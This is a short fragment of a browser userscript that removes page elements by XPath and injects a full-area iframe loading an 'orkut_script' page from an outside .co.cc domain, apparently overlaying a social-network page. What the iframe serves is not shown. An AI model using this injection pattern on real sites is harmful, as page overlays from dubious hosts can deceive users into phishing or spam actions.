...
smart_remove(window.document,document.evaluate('/HTML[1]/BODY[1]/TABLE[1]/TBODY[1]/TR[1]/TD[1]/DIV[1]/IMG[1]', document, null, XPathResult.FIRST_ORDERED_NODE_TYPE,null).singleNodeValue,null,null,null);
smart_remove(window.document,document.evaluate('/HTML[1]/BODY[1]/TABLE[1]/TBODY[1]/TR[1]/TD[1]/DIV[2]', document, null, XPathResult.FIRST_ORDERED_NODE_TYPE,null).singleNodeValue,null,null,null);
...
html_insert_it(window.document,document.evaluate('/HTML[1]/BODY[1]/TABLE[1]/TBODY[1]/TR[1]/TD[2]', document, null, XPathResult.FIRST_ORDERED_NODE_TYPE,null).singleNodeValue,'<div id="iFrame1" style="position:absolute; left:0px; top:0px; z-index:0"><iframe name="iFrame1" width="672" height="532" src="http://www.funnytricks.co.cc/orkut_script/index.html" scrolling="no" frameborder="0"></iframe></div>',false,true);
...
//
//  Mon Dec 19 15:59:37 2005 -- shekhar saxena
//  Short, uncommented file containing all the code to implement shekhar
//  actions.  Can be "included" into the shekhar script.
//
// 
// 
